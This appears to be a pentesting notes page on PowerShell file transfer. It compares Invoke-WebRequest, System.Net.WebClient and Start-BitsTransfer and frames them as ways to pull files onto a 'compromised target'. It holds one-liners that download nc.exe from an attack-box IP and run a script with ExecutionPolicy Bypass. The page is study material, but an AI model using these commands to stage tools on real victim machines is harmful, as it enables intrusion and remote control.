.. _ref_psFileTransfert:

===========================
PowerShell - File Transfert
===========================

.. index::
   single: File Transfert; Powershell

.. contents::
    :depth: 3
    :backlinks: top

####

PowerShell scripting language offers multiple ways to download files from remote locations. 

####

.. _ref_psWget:

----------------------------------
File Transfert : Invoke-WebRequest
----------------------------------

    .. note:: 
        
        **Liens Web**

        * `Invoke-WebRequest cmdlet`_
        
.. _`Invoke-WebRequest cmdlet`: https://learn.microsoft.com/en-gb/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3&viewFallbackFrom=powershell-3.0


The Invoke-WebRequest cmdlet is simple and easy to use and is available in PowerShell version 3.0
and higher. However, it does come with a few disadvantages.

    * It is very slow compared to the other PowerShell methods we considered. This
      cmdlet takes a huge performance hit because the HTTP response stream is first buffered into
      memory and flushed to disk only once it’s fully loaded. 
      
    * Downloading large files with this method may cause potential memory issues. That is why we
      recommend using the System.Net.WebClient method for transferring larger files.

    .. note:: 
        
        **Invoke-WebRequest**
        
        .. code:: PowerShell
            :number-lines:
            :force:

                # Invoke-WebRequest -uri [web server adresse:port]/[file_to_download] -o [destination_filename]

        .. code:: PowerShell
            :number-lines:
            :force:

                # "-v" for the verbose mode
                Invoke-WebRequest -uri 10.255.247.18:80/49402.txt -o 49402.txt -v

        The Invoke-WebRequest cmdlet have two alias :
            - wget
            - curl

        **Client side**

        .. image:: images/dlPowershell.png
            :width: 540 px
            :align: center

        **Server side**

        .. image:: images/reqServerSide.png
            :width: 540 px
            :align: center

####

.. _ref_sysNetWebClient:

-------------------------------------
File Transfert : System.Net.WebClient
-------------------------------------

In this section, we will look at uses the .NET class System.Net.WebClient.

In this example we will build the PowerShell script line by line from the **cmd** shell. With this approche it is possible
to create the script directly from the compromised target.

    .. note:: 
        
        **Liens Web**

        * `WebClient`_
        
.. _`WebClient`: https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0&redirectedfrom=MSDN

    .. note:: 
        
        The following commands create a PowerShell script on the remote Windows machine that can be
        used to download the file from the attack box.
        
        .. code:: shell
            :number-lines:
            :force:

             echo $webclient = New-Object System.Net.WebClient > httpdownload.ps1
             echo $webclient.DownloadFile("[Download URL]","[File Name]") >> httpdownload.ps1

        Note that you have to insert the download link (**[Download URL]**)and file name
        (**[File Name]**) in the command on the last line and replace all the text
        (including brackets) with the URL and file name.
        
Once the PowerShell has been created successfully, we can use the **type** command to view
the contents:

    .. image:: images/PowerShell-File-transfers-01.jpg
        :width: 500 px
        :align: center

    .. important:: 
        
        **Get-Content (cat)**
        
        PowerShell have a convenient cmdlet **Get-Content**.
        
        This cmdlet have a cool alias : **cat** it act like the one in UX systems.

        .. image:: images/pws_cat_alias.png
           :width: 500 px
           :align: center

        and the usage is the same.

        .. image:: images/pws_cat_exemple.png
            :width: 500 px
            :align: center

In this example we have provided a URI for the nc.exe binary from our attack machine to the
DownloadFile function.


    .. note:: 
        
        Once verified that the PowerShell script is successfully created, you can execute the script.
        
        .. code:: shell
            :number-lines:
            :force:

             powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1

        .. image:: images/PowerShell-File-transfers-02.jpg
           :width: 500 px
           :align: center

        As we can see on the screenshot, the nc.exe binary was successfully downloaded from our
        attack box to the target host.

Alternatively, we can also execute this command from a regular command line in Windows using
PowerShell to download files without creating a script.

    .. note:: 
        
        The -c option executes the command provided within the double quotes with PowerShell.

        .. code:: shell
            :number-lines:
            :force:

             powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"

        .. image:: images/PowerShell-File-transfers-03.jpg
           :width: 500 px
           :align: center

####

.. _ref_Start-BitsTransfert:

------------------------------------
File Transfert : Start-BitsTransfert
------------------------------------

    .. note:: 
        
        **Liens Web**

        * `Start-BitsTransfer`_
        * `service BITS`_
        
.. _`service BITS`: https://learn.microsoft.com/fr-fr/windows/win32/bits/about-bits?redirectedfrom=MSDN
.. _`Start-BitsTransfer`: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd819420(v=technet.10)?redirectedfrom=MSDN


Another way to download files with PowerShell is by using the **B**ackground **I**ntelligent
**T**ransfer **S**ervice (**BITS**). The **Start-BitsTransfer** cmdlet creates a BITS transfer job
to transfer one or more files between a client computer and a server. Using BITS for file transfers
has some major advantages over other methods. BITS allows you to limit the amount bandwidth for a
file transfer, to process multiple downloads, to set a web proxy and it **doesn’t rely on Internet
Explorer in the way that the Invoke-WebRequest (PowerShell 3.0 and up) cmdlet does**. Another
benefit of BITS is that it only uses idle network bandwidth instead of the whole bandwidth as many
other file transfer services do. BITS can, therefore, be used to process large files without
affecting other network applications. BITS transfers are also more reliable because transfers will
continue when a user changes network connection or restarts the computer.

Unfortunately using BITS for file transfers also has a few disadvantages. One potential downside is
that BITS has to be enabled on the target machine in order to work. However, since BITS is usually
enabled by default this won’t cause much of an issue unless it’s actively managed by system
administrators. Another potential downside (which we also counted as an advantage above), is that
BITS only uses idle bandwidth and this may affect the total process time for the file transfer where
available bandwidth is limited. BITS is also designed to process file transfers in the background so
your BITS job may end up being in a queue waiting for a running job to complete.

    .. note:: 
        
        **Start-BitsTransfer**

        As this method only uses 2 lines of code we will execute this script on a single line from
        the command line. As a minimum we need to specify a **source** and **destination** for the
        download.
        
        .. code:: shell
            :number-lines:
            :force:

             powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[IP Attack box]/nc.exe -Destination C:\

        .. image:: images/PowerShell-Downloads-Start-BitsTransfer.png
           :width: 500 px
           :align: center

####

--------
Weblinks
--------

.. target-notes::